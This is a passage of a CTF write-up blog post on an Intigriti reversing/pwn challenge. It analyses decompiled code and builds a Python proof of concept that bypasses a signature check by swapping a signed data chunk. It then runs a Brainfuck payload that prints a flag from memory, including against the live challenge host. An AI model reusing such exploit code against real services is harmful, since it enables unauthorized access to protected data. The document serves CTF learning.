+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>] <span style="color:#f92672">=</span> local_68;                    <span style="color:#75715e">// fs_base - 0x50
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>] <span style="color:#f92672">=</span> lStack_60;                    <span style="color:#75715e">// fs_base - 0x48
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">0xb</span>] <span style="color:#f92672">=</span> lStack_70;                  <span style="color:#75715e">// fs_base - 0x58
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    in_FS_OFFSET[<span style="color:#f92672">-</span><span style="color:#ae81ff">0xc</span>] <span style="color:#f92672">=</span> local_78;                   <span style="color:#75715e">// fs_base - 0x60 : flag[0]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>(Note that in Ghidra&rsquo;s syntax, <code>in_FS_OFFSET[-N]</code> corresponds to 8 bytes at <code>fs_base - 8xN</code>, for instance <code>in_FS_OFFSET[-0xc]</code> matches <code>fs_base - 12*8</code>. Moreover, <code>in_FS_OFFSET + -2 (undefined1)</code> corresponds to one byte at <code>fs_base - 0x10</code>)</p>
+<p>As the calling convention is the following, the start of the brainfuck byte array which will be executed should be the <code>fs_base-0x160</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>(<span style="color:#f92672">*</span>local_4c8)(local_24c8 <span style="color:#f92672">+</span> local_4a8,          <span style="color:#75715e">// arg1 = data pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             <span style="color:#f92672">*</span>in_FS_OFFSET <span style="color:#f92672">+</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">0x160</span>,          <span style="color:#75715e">// arg2 = fs_base-0x160
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>             FUN_00105c30);                   <span style="color:#75715e">// arg3 = exit callback
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// equivalent to the earlier 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// code_page(inbuf + data_offset, 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         fs_base - 0x160, 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//         exit_callback);
+</span></span></span></code></pre></div><p>Hence, as our goal is printing the flag, so <code>fs_base-0x60</code> to <code>fs_base-0x10</code>, we should move our pointer to <code>fs_base-0x60</code> and print the characters one by one. So simple math, we would need to move our pointer <code>(fs_base-0x60)-(fs_base-0x160)=0x160-0x60=0x100=256 bytes</code> forward, then print the characters one at a time.</p>
+<blockquote>
+<p>Small Brainfuck reminder :<br>
+<code>&gt;</code> : pointer+=1<br>
+<code>.</code> : output the byte at array[pointer]</p>
+</blockquote>
+<p>Hence, in our case, we will have 256 <code>&gt;</code> ( to point to <code>flag[0]</code> followed by 80 <code>.&gt;</code> to print each flag byte with a final <code>.</code> for the last one.</p>
+<p>Let&rsquo;s construct our final payload.</p>
+<h2 id="poc">PoC</h2>
+<p>We will first test our exploit locally using the python code below:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span> struct<span style="color:#f92672">,</span> re
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>HOST, PORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;localhost&#34;</span>, <span style="color:#ae81ff">8080</span>
+</span></span><span style="display:flex;"><span>HANDSHAKE <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">cmd</span>(name, data<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w&#34;</span> <span style="color:#f92672">+</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, len(data)) <span style="color:#f92672">+</span> name <span style="color:#f92672">+</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send</span>(stream):
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>create_connection((HOST, PORT))
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>sendall(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;POST /custom_protocol HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Content-Length: </span><span style="color:#e6db74">{</span>len(stream)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> stream
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(iter(<span style="color:#66d9ef">lambda</span>: s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">65536</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>))<span style="color:#f92672">.</span>partition(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> body
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## send HELP </span>
+</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> send(HANDSHAKE <span style="color:#f92672">+</span> cmd(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;HELP&#34;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">assert</span> body<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;ACK</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>), body[:<span style="color:#ae81ff">16</span>]
+</span></span><span style="display:flex;"><span>blob <span style="color:#f92672">=</span> body[<span style="color:#ae81ff">4</span>:]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## &#39;w&#39; + u32(L) + name(4) + payload(L - 4)</span>
+</span></span><span style="display:flex;"><span>chunks, i <span style="color:#f92672">=</span> {}, <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> i <span style="color:#f92672">+</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">&lt;=</span> len(blob) <span style="color:#f92672">and</span> blob[i:i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;w&#34;</span>:
+</span></span><span style="display:flex;"><span>    L <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, blob[i<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>])[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    name, data <span style="color:#f92672">=</span> blob[i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>], blob[i<span style="color:#f92672">+</span><span style="color:#ae81ff">9</span>:i<span style="color:#f92672">+</span><span style="color:#ae81ff">5</span><span style="color:#f92672">+</span>L]
+</span></span><span style="display:flex;"><span>    chunks[name] <span style="color:#f92672">=</span> data
+</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">+=</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> L
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## extracting code, 1st DATA and the valid signature</span>
+</span></span><span style="display:flex;"><span>code, data1, sign <span style="color:#f92672">=</span> chunks[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;CODE&#34;</span>], chunks[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DATA&#34;</span>], chunks[<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SIGN&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## 2nd DATA : 256 &#39;&gt;&#39; + &#39;.&gt;&#39; x 80 + &#39;.&#39; + padding to len(1st DATA) with &#39;&gt;&#39; (so the hash span = len(1st DATA))</span>
+</span></span><span style="display:flex;"><span>data2 <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&gt;&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;.&#34;</span>)<span style="color:#f92672">.</span>ljust(len(data1), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&#34;</span>)[:len(data1)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## payload: CODE | DATA1(signed) | DATA2(executed) | SIGN | EXEC</span>
+</span></span><span style="display:flex;"><span>body <span style="color:#f92672">=</span> send(
+</span></span><span style="display:flex;"><span>    HANDSHAKE
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> cmd(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;CODE&#34;</span>, code)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> cmd(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DATA&#34;</span>, data1)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> cmd(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;DATA&#34;</span>, data2)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> cmd(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;SIGN&#34;</span>, sign)
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">+</span> cmd(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;EXEC&#34;</span>)
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">response: </span><span style="color:#e6db74">{</span>body<span style="color:#e6db74">!r}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>The latter yields 5 <code>ACK</code> followed by our fake flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>response: b&#39;ACK\x00ACK\x00ACK\x00ACK\x00ACK\x00INTIGRITI{THIS_IS_A_FAKE_FLAG_USE_IT_TO_SOLVE_LOCALLY_THEN_REPLAY_TO_THE_SERVER}\x00&#39;                                     
+</span></span></code></pre></div><p>Finally, let&rsquo;s change our host to <code>challenge-1126.challenges.intigriti.io</code> and set our port to 443 alongside including the required SSL changes in the <code>send</code> function which becomes</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>HOST, PORT <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;challenge-1126.challenges.intigriti.io&#34;</span>, <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send</span>(stream):
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>create_connection((HOST, PORT))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> PORT <span style="color:#f92672">==</span> <span style="color:#ae81ff">443</span>:
+</span></span><span style="display:flex;"><span>        s <span style="color:#f92672">=</span> ssl<span style="color:#f92672">.</span>create_default_context()<span style="color:#f92672">.</span>wrap_socket(s, server_hostname<span style="color:#f92672">=</span>HOST)
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>sendall(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;POST /custom_protocol HTTP/1.1</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>HOST<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Content-Length: </span><span style="color:#e6db74">{</span>len(stream)<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">Connection: close</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> stream
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    body <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(iter(<span style="color:#66d9ef">lambda</span>: s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">65536</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>))<span style="color:#f92672">.</span>partition(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> body
+</span></span></code></pre></div><p>This should do the following :
+<img src="image-10.png" alt="thumbnail"></p>
+<p>Running our updated code yields the flag (minus the 1st <code>I</code> of Intigriti x) but that should be fixed by changing the 256 <code>&gt;</code> to 255):
+<img src="image-9.png" alt="alt text"></p>
+<p>Finally, our flag is <strong><code>INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}</code></strong></p>
+
+    </div>
+    
+
+  </div>
+
+
+  </main>
+  <footer>
+    
+<p>© 2026 Sto ʚɞ. All rights reserved.</p>
+  </footer>
+</body>
+</html>
